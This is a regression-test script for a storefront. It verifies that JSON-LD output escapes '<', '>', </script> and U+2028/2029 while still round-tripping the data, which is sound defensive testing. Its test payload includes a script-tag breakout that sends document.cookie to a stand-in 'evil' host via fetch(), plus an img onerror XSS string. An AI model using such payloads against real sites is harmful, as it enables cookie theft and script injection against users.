/**
 * Regression guard for the JSON-LD script-tag escape.
 *
 * The original bug was a single-backslash escape in json-ld.tsx, which the
 * TypeScript parser resolves before the replace ever runs -- so the call
 * replaced "<" with "<" and every product name went into the <script> block
 * unescaped. It looked correct in review, which is exactly why it needs a test.
 *
 * No test runner: the storefront has none, and this needs no dependency.
 * Run with `npm run check:seo` (part of `npm run verify`).
 */
import fs from "node:fs"
import path from "node:path"
import { fileURLToPath } from "node:url"

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..")
const source = fs.readFileSync(path.join(root, "components/seo/json-ld.tsx"), "utf8")

const match = source.match(/function escapeForScriptTag[\s\S]*?\n}/)
if (!match) {
  console.error("FAIL: escapeForScriptTag not found in components/seo/json-ld.tsx")
  process.exit(1)
}

const escape = new Function(
  `${match[0].replace("): string", ")").replace(/: string/g, "")}; return escapeForScriptTag`,
)()

// Written as char codes on purpose: a literal U+2028 in source is invisible
// and any editor or formatter can silently eat it, making the check vacuous.
const LINE_SEPARATOR = String.fromCharCode(0x2028)
const PARAGRAPH_SEPARATOR = String.fromCharCode(0x2029)

const failures = []
const check = (label, condition) => {
  if (!condition) failures.push(label)
}

const payload = {
  name: "لابتوب</script><script>fetch('https://evil/'+document.cookie)</script>",
  description: "<img src=x onerror=alert(1)>",
  separators: `a${LINE_SEPARATOR}b${PARAGRAPH_SEPARATOR}c`,
}
const output = escape(JSON.stringify(payload))

check("output must not contain a raw '<'", !output.includes("<"))
check("output must not contain a raw '>'", !output.includes(">"))
check("output must not contain a raw </script>", !/<\/script>/i.test(output))
check("output must not contain a raw U+2028", !output.includes(LINE_SEPARATOR))
check("output must not contain a raw U+2029", !output.includes(PARAGRAPH_SEPARATOR))

// Escaping is worthless if it corrupts the data Google reads.
const parsed = JSON.parse(output)
check("name must survive the round-trip", parsed.name === payload.name)
check("description must survive the round-trip", parsed.description === payload.description)
check("separators must survive the round-trip", parsed.separators === payload.separators)

if (failures.length > 0) {
  console.error("FAIL: JSON-LD escaping is broken\n" + failures.map((f) => `  - ${f}`).join("\n"))
  process.exit(1)
}

console.log("PASS: JSON-LD escaping blocks script-tag breakout and round-trips cleanly")
